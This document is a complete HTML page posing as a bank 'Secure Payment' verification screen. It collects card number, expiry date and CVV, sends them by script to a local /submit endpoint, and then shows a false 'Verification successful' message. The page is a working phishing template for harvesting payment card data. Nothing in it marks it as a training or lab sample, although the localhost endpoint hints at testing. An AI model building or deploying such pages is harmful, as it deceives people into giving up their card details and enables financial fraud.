<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank Verification</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: white; border-radius: 5px; width: 350px; padding: 40px 30px; box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); text-align: center; }
        .input-field { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 5px; box-sizing: border-box; }
        .login-btn { width: 100%; padding: 10px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Secure Payment</h2>
        <form id="loginForm">
            <input type="text" class="input-field" name="card" id="card" placeholder="Card Number" required>
            <input type="text" class="input-field" name="expiry" id="expiry" placeholder="MM/YY" required>
            <input type="password" class="input-field" name="cvv" id="cvv" placeholder="CVV" required>
            <button type="submit" class="login-btn">Confirm Payment</button>
        </form>
    </div>
    <script>
        document.getElementById("loginForm").addEventListener("submit", function (event) {
            event.preventDefault();
            const card = document.getElementById("card").value;
            const expiry = document.getElementById("expiry").value;
            const cvv = document.getElementById("cvv").value;
            const data = { card: card, expiry: expiry, cvv: cvv };

            fetch('http://localhost:8000/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
                alert('Verification successful');
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
